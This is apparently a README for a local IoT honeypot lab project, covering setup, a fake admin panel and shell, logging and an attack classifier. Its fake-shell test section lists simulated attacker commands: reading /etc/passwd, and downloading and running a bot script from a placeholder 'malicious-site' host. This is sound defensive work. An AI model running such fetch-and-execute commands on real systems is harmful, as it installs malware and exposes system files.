# Adaptive IoT Honeypot Starter

A safe local starter project for an **Adaptive IoT Honeypot with Behavior Logging and Attack Classification**.

This starter includes:

- Fake IoT HTTP admin panel
- Fake IoT shell listener on port `2222`
- SQLite logging
- Rule-based attack classifier
- Simple dashboard/API using Flask
- Safe local testing commands

> Important: This starter is for controlled lab/demo use. Do not expose it directly to the public internet.

---

## 1. Setup

```bash
cd adaptive-iot-honeypot-starter

python3 -m venv .venv
source .venv/bin/activate

pip install -r requirements.txt
```

---

## 2. Run the honeypot

```bash
python app/main.py
```

It will start:

| Service | URL / Port |
|---|---|
| Dashboard | http://127.0.0.1:5000 |
| Fake HTTP IoT Admin Panel | http://127.0.0.1:8080 |
| Fake IoT Shell | 127.0.0.1:2222 |

---

## 3. Test fake HTTP attack

Open:

```text
http://127.0.0.1:8080/admin
http://127.0.0.1:8080/login
```

Try posting login data:

```bash
curl -X POST http://127.0.0.1:8080/login \
  -d "username=admin&password=admin123"
```

---

## 4. Test fake shell attack

Use `nc`:

```bash
nc 127.0.0.1 2222
```

Then type commands:

```bash
whoami
uname -a
cat /etc/passwd
wget http://malicious-site/bot.sh
chmod +x bot.sh
./bot.sh
exit
```

---

## 5. View dashboard

Open:

```text
http://127.0.0.1:5000
```

API endpoint:

```text
http://127.0.0.1:5000/api/events
```

---

## Project structure

```text
adaptive-iot-honeypot-starter/
├── app/
│   ├── main.py
│   ├── database.py
│   └── config.py
├── services/
│   ├── fake_http.py
│   └── fake_shell.py
├── analyzer/
│   └── classifier.py
├── data/
│   └── honeypot.db
├── logs/
├── requirements.txt
└── README.md
```

---

## Next improvements

1. Add fake MQTT service.
2. Add fake Telnet service.
3. Add Docker support.
4. Add charts to the dashboard.
5. Add ML classifier using scikit-learn.
6. Export JSON/CSV/PDF reports.
7. Add STIX-style threat intelligence output.
